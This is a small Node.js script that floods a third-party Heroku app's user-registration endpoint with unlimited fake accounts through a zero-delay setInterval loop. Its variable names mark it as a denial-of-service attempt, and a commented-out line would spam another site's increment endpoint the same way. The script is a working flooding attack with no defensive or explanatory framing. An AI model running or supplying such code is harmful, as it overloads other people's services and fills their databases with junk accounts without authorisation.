const http = require('http');
const server = http.createServer((req , res) => res.end('asd'))
server.listen(process.env.PORT)
const axios = require('axios')

//setInterval(() => axios.get('https://dadlaughbutton.com/increment.php'))

i=0

async function makePostRequest() {

    params = {
        "user[username]" : "asddosat"+i,
        "user[email]": "emaildos"+i+"@xyz.com",
        "user[password]" : "123456"
      }

    let res = await axios.post('https://discord-clone.herokuapp.com/api/user', params);

    i++
}


setInterval(() => {
  

   
    makePostRequest();
})
